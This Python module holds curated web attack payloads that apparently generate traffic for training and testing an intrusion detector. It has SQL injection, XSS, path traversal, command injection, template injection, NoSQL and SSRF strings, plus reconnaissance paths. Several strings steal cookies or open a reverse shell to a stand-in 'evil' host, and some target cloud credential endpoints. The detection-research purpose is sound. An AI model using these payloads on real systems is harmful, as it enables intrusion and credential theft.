"""Curated attack payloads for the `custom` tool.

They are deliberately disjoint from the SecLists lists ffuf uses. The detector is trained on
one tool's rows and tested on the held-out tool's rows per family, so a shared payload string
would leak the cross-tool test. These are well-known real payloads, hand-curated rather than
drawn from SecLists, and each is a genuine attack string for its family. The family comes
from the campaign manifest; these are never matched against a detection rule.
"""

# SQL injection — distinct from SecLists Generic-SQLi.txt
SQLI = [
    "1' OR '1'='1", "1' OR 1=1-- -", "admin'--", "' UNION SELECT NULL,NULL,NULL-- -",
    "1'; DROP TABLE users-- -", "' OR 'x'='x", "1 AND SLEEP(5)", "' OR SLEEP(5)-- -",
    "1' AND '1'='2", "') OR ('1'='1", "1' UNION SELECT username,password,3 FROM users-- -",
    "1'||(SELECT 1 FROM dual)||'", "' AND extractvalue(1,concat(0x7e,version()))-- -",
    "1' AND 1=CONVERT(int,(SELECT @@version))-- -", "'; WAITFOR DELAY '0:0:5'-- -",
    "1' ORDER BY 10-- -", "1' GROUP BY 1,2,3-- -", "0x31 OR 1=1", "1'/**/OR/**/1=1",
    "' OR 1=1 LIMIT 1-- -", "1' AND (SELECT COUNT(*) FROM users)>0-- -",
]

# XSS — distinct from SecLists XSS-Fuzzing.txt
XSS = [
    "<script>alert(1)</script>", "<img src=x onerror=alert(document.cookie)>",
    "<svg/onload=alert(1)>", "javascript:alert(1)", "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
    "<body onload=alert(1)>", "<iframe src=javascript:alert(1)>", "<a href=javascript:alert(1)>x</a>",
    "<input autofocus onfocus=alert(1)>", "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>", "\"><img src=x onerror=fetch('//evil/'+document.cookie)>",
    "<script>document.location='//evil/?c='+document.cookie</script>", "<video><source onerror=alert(1)>",
    "<math><mtext></mtext><script>alert(1)</script>", "<template><script>alert(1)</script></template>",
]

# Path traversal — distinct from LFI-Jhaddix.txt
PATH_TRAVERSAL = [
    "../../../../etc/passwd", "..%2f..%2f..%2f..%2fetc%2fpasswd", "....//....//....//etc/passwd",
    "..%252f..%252f..%252fetc%252fpasswd", "/etc/passwd%00", "..\\..\\..\\windows\\win.ini",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "../../../../../../../../etc/shadow",
    "file:///etc/passwd", "....\\\\....\\\\....\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
    "..%c0%af..%c0%af..%c0%afetc/passwd", "/var/www/../../etc/passwd", "php://filter/resource=/etc/passwd",
]

# Command injection — distinct from command-injection-commix.txt
CMD_INJECTION = [
    "; cat /etc/passwd", "| id", "&& whoami", "`id`", "$(cat /etc/passwd)", "; sleep 5",
    "| nc -e /bin/sh evil 4444", "&& curl http://evil/$(whoami)", "; ping -c 4 evil.com",
    "|| uname -a", "%0acat%20/etc/passwd", "; ls -la /", "& type C:\\windows\\win.ini",
    "$(sleep 5)", "`sleep 5`", "; python -c 'import os;os.system(\"id\")'",
]

# SSTI, spanning template engines and contexts. The SecLists ssti lists are tiny.
SSTI = [
    "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{{7*'7'}}", "${{7*7}}", "@(7*7)",
    "{{config}}", "{{''.__class__.__mro__[1].__subclasses__()}}",
    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    "${T(java.lang.Runtime).getRuntime().exec('id')}", "#{T(java.lang.Runtime).getRuntime().exec('id')}",
    "{%print(7*7)%}", "${{<%[%'\"}}%\\", "{{7*7}}${7*7}<%=7*7%>", "*{7*7}", "~{7*7}",
    "{{ '7'*7 }}", "{php}echo 7*7;{/php}", "#set($x=7*7)$x",
]

# NoSQL injection — JSON operator injection, sent as body fields
NOSQL = [
    {"username": {"$ne": None}, "password": {"$ne": None}},
    {"username": {"$gt": ""}, "password": {"$gt": ""}},
    {"username": "admin", "password": {"$ne": "x"}},
    {"username": {"$regex": "^adm"}, "password": {"$ne": ""}},
    {"username": {"$in": ["admin", "root"]}, "password": {"$ne": None}},
    {"username": {"$where": "1==1"}, "password": {"$ne": None}},
    {"username": {"$exists": True}, "password": {"$exists": True}},
    {"username": {"$nin": [""]}, "password": {"$nin": [""]}},
    {"username[$ne]": "", "password[$ne]": ""},
    {"username": "admin', $where: '1==1", "password": "x"},
]

# SSRF: internal, loopback and metadata targets. SecLists ships no file for this.
SSRF = [
    "http://127.0.0.1:8080/", "http://localhost/admin", "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://[::1]:80/", "http://0.0.0.0:22/", "http://metadata.google.internal/computeMetadata/v1/",
    "file:///etc/passwd", "gopher://127.0.0.1:6379/_INFO", "dict://127.0.0.1:11211/stats",
    "http://127.0.0.1:5000/users/v1/_debug", "http://internal-service.local/",
    "http://172.30.0.2:5000/", "http://[0:0:0:0:0:ffff:127.0.0.1]/", "https://127.0.0.1:443/",
]


# Scanner probe paths: real reconnaissance targets such as config, backup, admin and version
# files and framework endpoints. Distinct from ffuf's SecLists common.txt so the cross-tool
# holdout does not leak. The custom scanner sends them with enumeration and verb tampering.
SCAN_PATHS = [
    "/.env", "/.git/config", "/.git/HEAD", "/config.php", "/wp-config.php", "/wp-admin/",
    "/wp-login.php", "/admin", "/admin/login", "/administrator", "/phpinfo.php", "/info.php",
    "/server-status", "/server-info", "/.htaccess", "/.htpasswd", "/backup.sql", "/db.sql",
    "/dump.sql", "/backup.zip", "/backup.tar.gz", "/.svn/entries", "/.DS_Store", "/robots.txt",
    "/sitemap.xml", "/crossdomain.xml", "/actuator", "/actuator/health", "/actuator/env",
    "/api", "/api/v1", "/api/v2", "/api-docs", "/swagger.json", "/swagger-ui.html",
    "/openapi.json", "/graphql", "/metrics", "/debug", "/console", "/.well-known/security.txt",
    "/cgi-bin/", "/shell.php", "/webshell.php", "/test.php", "/phpmyadmin/", "/adminer.php",
    "/jenkins", "/manager/html", "/solr/", "/elasticsearch", "/.aws/credentials",
    "/id_rsa", "/web.config", "/appsettings.json", "/composer.json", "/package.json",
    "/vendor/", "/node_modules/", "/.vscode/", "/CHANGELOG.md", "/license.txt", "/readme.html",
]
SCAN_VERBS = ["OPTIONS", "TRACE", "PUT", "DELETE", "PATCH", "HEAD", "PROPFIND"]


def all_families() -> dict:
    return {
        "sqli": SQLI, "xss": XSS, "path_traversal": PATH_TRAVERSAL,
        "cmd_injection": CMD_INJECTION, "ssti": SSTI, "nosql_injection": NOSQL, "ssrf": SSRF,
    }
